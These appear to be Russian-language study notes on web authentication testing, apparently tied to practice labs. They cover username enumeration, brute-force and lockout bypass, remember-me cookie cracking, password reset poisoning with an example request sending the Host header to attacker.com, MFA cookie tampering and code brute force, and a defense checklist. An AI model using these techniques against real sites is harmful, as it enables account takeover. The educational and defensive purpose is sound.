## 1. Основы

**Аутентификация** — проверка того, что субъект (пользователь, сервис) является тем, за кого себя выдаёт.

**Авторизация** — проверка, разрешено ли субъекту выполнять конкретное действие.

| Термин | Вопрос | Пример |
|---|---|---|
| Authentication | *Кто ты?* | Проверка, что `carlos` — владелец аккаунта |
| Authorization | *Что тебе можно?* | Проверка, может ли `carlos` удалять чужие аккаунты |

**Ключевая идея:** уязвимости аутентификации возникают по двум причинам:
1. **Слабый механизм** — не защищает от перебора.
2. **Логическая ошибка** — позволяет обойти проверку целиком (broken authentication).

## 2. Типы аутентификации

| Фактор | Что это | Примеры |
|---|---|---|
| **Knowledge** (знание) | То, что пользователь знает | Пароль, PIN, секретный вопрос |
| **Possession** (владение) | То, чем пользователь обладает | Телефон, TOTP-токен, смарт-карта |
| **Inherence** (биометрия) | То, чем пользователь является | Отпечаток, Face ID, голос |

**MFA** — комбинация **разных** факторов. Пароль + секретный вопрос — это **не MFA** (оба знания). Пароль + TOTP-код — MFA.

## 3. Методология тестирования

Последовательность проверки любой формы аутентификации:

```
1. Username enumeration?
   └→ разные ответы / статусы / тайминги для валидного и невалидного логина

2. Brute-force защита?
   └→ rate limit, lockout, CAPTCHA, сброс счётчика

3. Логические обходы?
   └→ пропуск шага, подмена параметров, состояние клиента

4. Доп. функции?
   └→ remember-me, password reset, password change, регистрация

5. MFA?
   └→ обход шага, перебор кода, подмена идентификатора
```

**Что всегда проверять:**
- Разные ответы при неверном логине vs неверном пароле
- Тайминги ответа (существующий логин → дольше)
- Поведение при блокировке (по IP? по аккаунту? сбрасывается?)
- Все параметры запроса — можно ли подменить `username`, `user`, `account`, `id`
- Куки и токены — можно ли декодировать/предсказать/подделать

## 4. Password-based login

### 4.1 Username Enumeration

Определение существующих логинов по разнице в поведении сервера.

| Индикатор | Что смотреть |
|---|---|
| **Status code** | `200` vs `403` vs `302` |
| **Сообщение об ошибке** | «Неверный пароль» vs «Нет такого пользователя» |
| **Время ответа** | Существующий логин → дольше (проверка пароля) |
| **Длина ответа** | Разная длина HTML |

**Подход в Burp Intruder:**
- Атакуемый параметр: `username=§word§`
- Payload: список логинов (`SecLists/Usernames`)
- Сортировать по **Status code** и **Length** — выбросы = валидные логины

### 4.2 Brute-force

Автоматизированный перебор паролей с учётом поведения пользователей.

**Словари:**
- `rockyou.txt`, `SecLists/Passwords`
- Пользовательские паттерны: `Season+Year+Symbol`, `Word+Digits+!`

**Учёт политики паролей:**
- Минимальная длина (обычно 8)
- Запрет очевидных слов
- При смене пароля — минимальные изменения (`Password1!` → `Password2!`)

### 4.3 Обход защиты от брутфорса

| Защита | Обход |
|---|---|
| **Account lockout** | Перебор с **одним паролем** по многим логинам (password spraying) — ни один аккаунт не блокируется |
| **IP-бан** | Ротация IP; сброс счётчика успешным входом в свой аккаунт между попытками |
| **Rate limit** | Замедление запросов; распределение по сессии |
| **CAPTCHA** | OCR / аудио-обход; повторное использование токена |

**Password Spraying:**
```
Пароль: Password123!
Цели: admin, user1, user2, ... (много логинов, один пароль)
```

**Сброс счётчика через успешный вход:**
```
Попытка 1 → wrong
Попытка 2 → wrong
Вход в свой аккаунт → счётчик сброшен
Попытка 3 → wrong
...
```

## 5. Дополнительные механизмы

### 5.1 Remember Me / Stay Logged In

Сервер выдаёт долгоживущий токен в куке.

**Что проверять:**

| Проверка | Как |
|---|---|
| Декодируется ли кука? | Base64 decode, hex decode |
| Предсказуема ли? | Логин + timestamp, MD5(password), MD5(username+date) |
| Есть ли соль? | Если нет — hashcat по словарю |
| Можно ли подделать для другого юзера? | Изменить `username` в структуре куки |
| Можно ли получить через XSS? | Проверить флаг `HttpOnly` |

**Пример структуры:**
```
Cookie: stay-logged-in=dXNlcjpwYXNzd29yZA==
Base64 decode → user:password
```

**Пример атаки:**
```
stay-logged-in = base64(username + ":" + md5(password))
```
→ перебираем `md5` по словарю паролей для целевого пользователя.

### 5.2 Password Reset

**Опасные реализации:**

| Реализация | Проблема |
|---|---|
| Отправка пароля по email | Email — не защищённый канал |
| Сброс по `?user=victim` | Подмена логина в параметре |
| Токен = `md5(email)` | Предсказуем |
| Токен не привязан к пользователю | Можно использовать чужой токен |

**Password Reset Poisoning:**

Сервер формирует ссылку сброса из заголовка `Host` (или `X-Forwarded-Host`). Если заголовок контролируется — токен уйдёт на твой сервер.

```http
POST /forgot-password HTTP/1.1
Host: attacker.com
...
username=victim
```

→ В письме жертве ссылка вида `https://attacker.com/reset-password?token=XXX` → токен в твоих руках.

**Что проверять:**
1. Принимает ли сервер `X-Forwarded-Host` / `X-Host` в запросе сброса?
2. Угадывается ли токен (короткий, последовательный, предсказуемый)?
3. Привязан ли токен к конкретному пользователю?
4. Инвалидируется ли токен после использования?

### 5.3 Password Change

Форма смены пароля требует текущий пароль + новый (дважды).

**Что проверять:**

| Проверка | Payload / действие |
|---|---|
| Форма доступна без авторизации? | Открыть `/change-password` без куки |
| Username в скрытом поле? | `<input type="hidden" name="username" value="victim">` |
| Можно ли подменить username? | Изменить на `victim` |
| Используется ли для брутфорса? | Отправлять разные пароли в `current-password`, следить за ответом |

**Пример:**
```http
POST /my-account/change-password HTTP/1.1
username=wiener&current-password=§pass§&new-password=123&confirm-new-password=123
```
→ Перебираем `current-password` для чужого пользователя через Intruder.

## 6. MFA / 2FA

### 6.1 Обход MFA

**Логика:** после ввода пароля пользователь уже частично «вошёл», но должен ввести код. Ошибки в этом состоянии — критичны.

**Что проверять:**

| Проверка | Пример |
|---|---|
| Пропуск шага | Сразу перейти на `/admin` после ввода пароля, минуя код |
| Изменение куки между шагами | Кука `account=user` → `account=victim` перед отправкой кода |
| Повторное использование кода | Один и тот же код принимается несколько раз |
| Код в ответе / в отладке | `X-Debug: code=123456` |
| Код предсказуем | `0000`, `1234`, короткие последовательности |

### 6.2 Broken 2FA Logic

Пример: после первого шага сервер ставит куку с идентификатором пользователя. Второй шаг **использует эту куку** вместо сессии.

```http
POST /login-steps/first HTTP/1.1
username=victim&password=correct

HTTP/1.1 302 Found
Set-Cookie: account=victim

POST /login-steps/second HTTP/1.1
Cookie: account=carlos
verification-code=000000
```

→ Если подменить куку на `victim`, код проверится для **другого** пользователя.

### 6.3 Brute-force кода

Код 4–6 цифр → 10 000–1 000 000 комбинаций. Без rate limit перебор тривиален.

**Инструменты:**
- **Burp Intruder** — Sniper по позиции кода
- **Turbo Intruder** — для больших объёмов и race-condition
- **Macros** в Burp — если сессия сбрасывается после нескольких попыток

**Стратегия:**
1. Открыть Burp → Proxy → перехватить POST с кодом.
2. Send to Intruder → пометить `verification-code=§000000§`.
3. Payload: Numbers, 000000–999999, padding = 6.
4. Фильтр по **Status code** / **Length** — успех даст другой ответ.

## 7. Сводка уязвимостей и payload'ов

| Уязвимость | Признак | Действие |
|---|---|---|
| **Username enumeration** | Разные ответы | Intruder по логинам, сортировка по Length/Status |
| **Brute-force (без защиты)** | Нет rate limit | Intruder + словарь паролей |
| **Lockout** | Блок после N попыток | Password spraying по многим логинам |
| **IP ban** | Блок IP | Ротация IP, сброс успешным входом |
| **Remember-me** | Base64 / MD5 в куке | Декодировать, перебрать, подделать |
| **Reset poisoning** | Ссылка из `Host` | Подменить `Host` на свой домен |
| **Reset token weak** | Короткий / предсказуемый | Перебрать / вычислить |
| **Change без авторизации** | Форма доступна | Изменить пароль чужого юзера |
| **Change с hidden username** | `<input hidden>` | Подменить username на victim |
| **MFA bypass** | Пропуск второго шага | Прямой переход на защищённую страницу |
| **MFA logic flaw** | Кука с идентификатором | Подменить `account` / `user` |
| **MFA brute-force** | Короткий код | Intruder по 4–6 цифрам |

## 8. Защита: чек-лист

**Учётные данные:**
- HTTPS принудительно, HSTS
- Пароли только в теле POST, никогда в URL
- Не логировать пароли в plaintext

**Пароли:**
- Минимальная длина 8–12, проверка на утечки (`HaveIBeenPwned`)
- Валидатор стойкости (`zxcvbn`)
- `bcrypt` / `argon2` для хранения

**Против перебора:**
- Rate limit по IP **и** по аккаунту
- Одинаковые сообщения об ошибках и одинаковый тайминг
- CAPTCHA после N неудач
- Учёт `X-Forwarded-For` только от доверенных прокси

**Логика:**
- Проверять каждый шаг независимо
- Сессия должна привязываться к состоянию на сервере, не к клиентской куке
- Все операции (reset, change, MFA) — тестировать как отдельные системы

**MFA:**
- TOTP / WebAuthn вместо SMS
- Одноразовые коды, короткое время жизни
- Rate limit на проверку кода
- Код не должен возвращаться в ответе или логах

## 9. Термины

| Термин | Значение |
|---|---|
| **Authentication** | Проверка идентичности субъекта |
| **Authorization** | Проверка прав субъекта |
| **Username enumeration** | Определение существующих логинов |
| **Password spraying** | Один пароль против множества логинов |
| **Credential stuffing** | Использование утёкших пар (login:password) |
| **Account lockout** | Блокировка после N неудач |
| **Rate limiting** | Ограничение частоты запросов |
| **MFA / 2FA** | Многофакторная / двухфакторная аутентификация |
| **TOTP** | Time-based One-Time Password (Google Authenticator) |
| **SIM swapping** | Перехват SMS через подмену SIM |
| **Password reset poisoning** | Кража токена через подмену `Host` |
| **Remember-me token** | Долгоживущий токен в куке |

## 🎯 TL;DR — что проверять в первую очередь

1. **Enumeration** — сравни ответы для `admin`, `test`, `nonexistent_user_xyz`.
2. **Rate limit** — отправь 100 запросов, посмотри, блокируется ли.
3. **Remember-me** — декодируй куку, попробуй подделать.
4. **Password reset** — подмени `Host`, проверь предсказуемость токена.
5. **Change password** — подмени `username` в скрытом поле.
6. **MFA** — пропусти шаг, подмени куку между шагами.
7. **Логика** — читай код, если есть; думай, где состояние на клиенте.
